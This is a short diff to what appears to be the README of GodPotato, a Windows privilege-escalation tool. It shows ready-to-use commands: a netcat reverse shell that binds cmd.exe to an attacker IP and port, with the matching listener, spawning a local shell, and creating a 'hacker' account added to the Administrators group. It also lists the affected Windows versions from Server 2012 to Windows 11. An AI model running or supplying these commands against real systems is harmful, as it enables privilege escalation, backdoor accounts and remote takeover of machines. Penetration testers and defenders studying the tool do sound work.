@@ -334,6 +334,13 @@ GodPotato-NET4.exe
 GodPotato.exe -cmd "nc.exe -t -e C:\Windows\System32\cmd.exe 192.168.1.102(LHOST) 2012(LPORT)"
 nc.exe -nlvp 2012
 
+Local Shell:
+GodPotato.exe -cmd "cmd.exe"
+
+Add User to Privileged Group:
+GodPotato.exe -cmd "net user hacker Password123! /add"
+GodPotato.exe -cmd "net localgroup Administrators hacker /add"
+
 Affected version:
 Windows Server 2012 - Windows Server 2022 Windows8 - Windows 11
 ```
